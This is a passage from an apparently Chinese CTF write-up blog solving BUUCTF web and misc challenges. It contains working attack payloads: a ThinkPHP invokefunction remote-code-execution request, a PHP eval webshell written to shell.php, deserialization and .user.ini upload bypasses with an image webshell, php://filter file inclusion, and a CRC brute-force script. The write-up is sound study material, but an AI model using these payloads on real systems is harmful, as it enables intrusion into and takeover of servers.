number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>cat%20/flag</code></pre><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>这个方法是写入一句话，直接写一个一句话木马在里面，然后使用蚁剑或者菜刀连接就行了，这方法挺不错的。试一下！<br>payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">?s<span class="token operator">=</span>index/think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>file_put_contents<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>shell.php<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php%20eval<span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"m0re"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p>返回<br><img src="https://img-blog.csdnimg.cn/20200713144827396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>连接<br><img src="https://img-blog.csdnimg.cn/20200713144907572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到连接成功了，在根目录下可以找到flag</p><p>payload也有好几种，有兴趣的可以自行百度查看。</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>BUUCTFweb<br><img src="https://img-blog.csdnimg.cn/20200713152345195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到了备份网站，先用dirsearch扫一下<br>扫完了，看到<code>www.zip</code><br><img src="https://img-blog.csdnimg.cn/20200713153306123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>打开看到<code>flag.php</code>emmm？？？？<br><img src="https://img-blog.csdnimg.cn/20200713153448334.png" alt="m0re" loading="lazy"><br>果然提交了不对。还是要看另外两个文件<br>查看<code>index.php</code><br><img src="https://img-blog.csdnimg.cn/20200713153618479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后发现是利用PHP反序列化，<br><img src="https://img-blog.csdnimg.cn/20200713160638967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>当<code>username=admin</code>且<code>password=100</code>的时候输出flag，但是</p><p><img src="https://img-blog.csdnimg.cn/20200713160932176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个函数会把username变为guest，所以就需要序列化字符串中的对象来绕过。<br>代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'100'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这个是没有使用URL编码的</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将其结果使用URL进行编码</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">O:4:<span class="token string">"Name"</span>:2:<span class="token punctuation">&#123;</span>s:14:<span class="token string">"Nameusername"</span><span class="token punctuation">;</span>s:5:<span class="token string">"admin"</span><span class="token punctuation">;</span>s:14:<span class="token string">"Namepassword"</span><span class="token punctuation">;</span>s:3:<span class="token string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这个Name后面的数字是属性，代表两个变量，把2改成3，就能绕过__wakeup()函数。</p><blockquote><p>因为是private声明，我们需要在类名和字段名前面都会加上\0的前缀<br>这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p></blockquote><p>这段话是看一个师傅的wp中提到的，python提交方法</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requestsurl <span class="token operator">=</span><span class="token string">"http://e1a18420-fb66-465e-b486-f4a86ce4eb95.node3.buuoj.cn"</span>html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?select=O:4:"Name":3:&#123;s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;&#125;'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>可以得到flag<br><img src="https://img-blog.csdnimg.cn/20200713163600780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>不用python的话，在url栏中会出现\0<br>有空白符，而复制的时候会丢失。<br>加上%00</p><pre class="language-bash" data-language="bash"><code class="language-bash">O:4:<span class="token string">"Name"</span>:3:<span class="token punctuation">&#123;</span>s:14:<span class="token string">"%00Name%00username"</span><span class="token punctuation">;</span>s:5:<span class="token string">"admin"</span><span class="token punctuation">;</span>s:14:<span class="token string">"%00Name%00password"</span><span class="token punctuation">;</span>i:100<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这个也可以得到flag。<br>参考链接——<a href="https://www.cnblogs.com/wangtanzhi/p/12193930.html">https://www.cnblogs.com/wangtanzhi/p/12193930.html</a><br>还有一种方法是将序列化后的字符串先进行URL编码再提交，就不用python提交参数了。<br>payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://e1a18420-fb66-465e-b486-f4a86ce4eb95.node3.buuoj.cn/index.php?select<span class="token operator">=</span>O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</code></pre><p><img src="https://img-blog.csdnimg.cn/20200713162825301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>参考链接——<a href="https://www.cnblogs.com/kevinbruce656/p/12332736.html">https://www.cnblogs.com/kevinbruce656/p/12332736.html</a></p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img src="https://img-blog.csdnimg.cn/2020071316491257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>白给的shell。连接一句话，猜测可能是<code>shell.php</code><br>不过没有连接成功，现在的问题是shell的名字是什么？<br>看整个题的信息，能让人想到文件名的字符串也就是上面说的白给的shell还有题目的Knife了，<br><img src="https://img-blog.csdnimg.cn/20200713165338914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就在根目录下找到了flag</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>我先进行上传了一个<code>shell.php</code><br><img src="https://img-blog.csdnimg.cn/20200713171037442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>题目描述是有一个github地址的，那里有源码，<br>在index.php中找到了过滤条件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// error_reporting(0);</span><span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"uploads/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/index.php"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"upload"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"filesize too big!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"filename cannot be empty!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/ph|htacess/i"</span><span class="token punctuation">,</span> <span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"illegal suffix!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&lt;?"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&amp;lt;? in contents!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exif_imagetype:not image!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$upload_file_path</span> <span class="token operator">=</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$upload_file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your dir "</span> <span class="token punctuation">.</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span> <span class="token single-quoted-string string">' &lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Your files : &lt;br>'</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>找到了这个是因为BUUCTF有源码地址，所以在源码中找到的，看了好多师傅的wp，原来的题中应该是没有源码的，所以需要自己去筛选过滤条件。<br>先贴一下参考链接——🍗<a href="https://xz.aliyun.com/t/6091">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a><br>按照这个师傅的wp来复现一下。<br>上传后缀为PHP的木马文件未成功，后缀黑名单过滤，尝试aaa<br><img src="https://img-blog.csdnimg.cn/20200716103846568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>证明还检测文件内容了，文件中不能包含<code>&lt;?</code><br>然后换文件内容再次进行尝试<br><img src="https://img-blog.csdnimg.cn/20200716104136691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到，这个就是使用了函数<code>exif_imagetype</code>，对文件类型进行过滤，也就是上面的源码中显示的这一部分：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exif_imagetype:not image!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>然后再加一个GIF的文件头，<code>GIF89a</code><br><img src="https://img-blog.csdnimg.cn/20200716104717801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出，上传成功。还有一个<code>index.php</code>但是访问没有信息。<br>这些都是前置的一般上传步骤，然后网上的师傅们做这个题都是用的<code>.user.ini</code>上传后门。至于了解，参考链接那个师傅写过了，可以直接过去学习。</p><p>这里我就直接复现了<br>上传<code>.user.ini</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">GIF89a<span class="token assign-left variable">auto_prepend_file</span><span class="token operator">=</span>a.jpg</code></pre><p>上传成功后，<br><img src="https://img-blog.csdnimg.cn/20200716105606723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>再上传一个图片马</p><pre class="language-bash" data-language="bash"><code class="language-bash">GIF89a<span class="token operator">&lt;</span>script <span class="token assign-left variable">language</span><span class="token operator">=</span><span class="token string">'php'</span><span class="token operator">></span>system<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>成功上传后，访问</p><p><img src="https://img-blog.csdnimg.cn/20200716105821412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>访问即可得到flag：<a href="http://72d554a3-81e7-41c1-b987-c0c9432cbe16.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php">http://72d554a3-81e7-41c1-b987-c0c9432cbe16.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</a></p><p><code>.user.ini</code>利用条件</p><ol><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开寻找信息，查看源码。发现<code>Secret.php</code><br><img src="https://img-blog.csdnimg.cn/20200716110812671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>访问，发现需要从一个指定的网站访问<br><img src="https://img-blog.csdnimg.cn/20200716110927460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>抓包修改或添加Referer头<br><img src="https://img-blog.csdnimg.cn/20200716111319263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>又要用<code>Syclover</code>浏览器，修改<code>User-Agent</code><br><img src="https://img-blog.csdnimg.cn/20200716111511763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>只能本地访问<br>使用XFF进行伪造<code>127.0.0.1</code><br><img src="https://img-blog.csdnimg.cn/20200716111720235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>得到flag，还可以用插件<code>ModHeader</code>解题，不用抓包。<br><img src="https://img-blog.csdnimg.cn/20200716112203847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>不过都一样。</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>这道题，名字是include，应该是文件包含有关的。再看到点击tip会跳转到一个界面，但是没有flag<br>url是这样的<code>http://371426d5-5373-47c1-9bf0-a7f7ef140596.node3.buuoj.cn/?file=flag.php</code><br>看到file想到了PHP伪协议<br>所以就尝试解题。首先尝试了<code>php://input</code><br><img src="https://img-blog.csdnimg.cn/20200716113508232.png" alt="m0re" loading="lazy"><br>但是被过滤了。<br>其他的挨个试，发现<code>php://filter</code>可以，<br>payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://371426d5-5373-47c1-9bf0-a7f7ef140596.node3.buuoj.cn/?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>flag.php</code></pre><p><img src="https://img-blog.csdnimg.cn/20200716113820679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>进行解码得到flag</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>英语不好多少有点上头，不过问题不是很大<code>exec=执行</code><br>环境也是，应该就是命令执行了。<br><img src="https://img-blog.csdnimg.cn/2020071611423365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>感觉命令执行就是看谁linux系统玩的转了。<br><img src="https://img-blog.csdnimg.cn/20200716115036999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>备份文件，老规矩直接扫<br><img src="https://img-blog.csdnimg.cn/20200716122214309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个长度不同，所以是它<br>然后访问得到备份文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>接下来就是简单的PHP代码审计弱类型。<br>payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://3faea66d-27b6-4f7d-be12-d38ef1dc5b34.node3.buuoj.cn/?key<span class="token operator">=</span><span class="token number">123</span></code></pre><p>得到flag</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>解压得到68个压缩包，了解到考察点是CRC碰撞<br>一般需要CRC碰撞的题的特征：</p><ul><li>一般有很多zip的压缩包，</li><li>解压需要密码，且密码复杂，不可爆破</li><li>每个包很小，仅几k</li></ul><p>使用python脚本碰撞<br>CRC碰撞脚本(来源百度)</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> string<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">CrackCrc</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>         <span class="token keyword">for</span> j <span class="token keyword">in</span> dic<span class="token punctuation">:</span>            <span class="token keyword">for</span> k <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                <span class="token keyword">for</span> h <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                    s <span class="token operator">=</span> i <span class="token operator">+</span> j <span class="token operator">+</span> k <span class="token operator">+</span> h                    <span class="token keyword">if</span> crc <span class="token operator">==</span> <span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                        <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">CrackZip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'out'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.zip'</span>            crc <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>CRC            CrackCrc<span class="token punctuation">(</span>crc<span class="token punctuation">)</span>dic <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'+/='</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>CrackZip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"CRC32碰撞完成"</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close</code></pre><p>时间略久，等待。<br>然后得到一串base64编码，进行解码<br><img src="https://img-blog.csdnimg.cn/20200716143642518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><code>CF 90 73</code>查百度了解，知道是缺少rar头部的部分。<br><img 